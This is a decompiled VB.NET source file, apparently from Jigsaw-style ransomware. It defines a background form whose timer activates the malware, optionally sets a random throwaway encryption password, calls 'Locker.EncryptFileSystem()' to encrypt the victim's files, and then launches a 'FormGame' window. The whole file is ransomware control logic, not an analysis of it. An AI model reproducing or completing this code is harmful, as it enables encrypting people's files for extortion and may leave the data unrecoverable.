Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Windows.Forms
Imports Main.Tools

Namespace Main
	' Token: 0x02000007 RID: 7
	Public Partial Class FormBackground
		Inherits Form

		' Token: 0x06000012 RID: 18 RVA: 0x000022D9 File Offset: 0x000004D9
		Public Sub New()
			Me.InitializeComponent()
			Me.timerActivateChecker.Interval = Config.TimerActivateCheckerInterval
			Me.timerActivateChecker.Enabled = True
		End Sub

		' Token: 0x06000013 RID: 19 RVA: 0x00003268 File Offset: 0x00001468
		Private Sub timerActivateChecker_Tick(sender As Object, e As EventArgs)
			If Not Config.Activated AndAlso Hacking.ShouldActivate() Then
				Config.Activated = True
				FormBackground.ImposeRestrictions()
				New FormGame().Show(Me)
			End If
		End Sub

		' Token: 0x06000014 RID: 20 RVA: 0x0000329C File Offset: 0x0000149C
		Private Shared Sub ImposeRestrictions()
			If Config.DynamicEncryptionPassword AndAlso (Config.StartMode = Config.StartModeType.ErrorMessage OrElse Config.StartMode = Config.StartModeType.DeleteItself OrElse Config.StartMode = Config.StartModeType.NothingHappens) AndAlso (Process.GetCurrentProcess().MainModule.FileName.Contains(Config.TempExeRelativePath) OrElse Process.GetCurrentProcess().MainModule.FileName.Contains(Config.FinalExeRelativePath)) Then
				Config.EncryptionPassword = UtilitiesProcess.GenerateCoupon(30) + "=="
			End If
			Locker.EncryptFileSystem()
		End Sub
	End Class
End Namespace
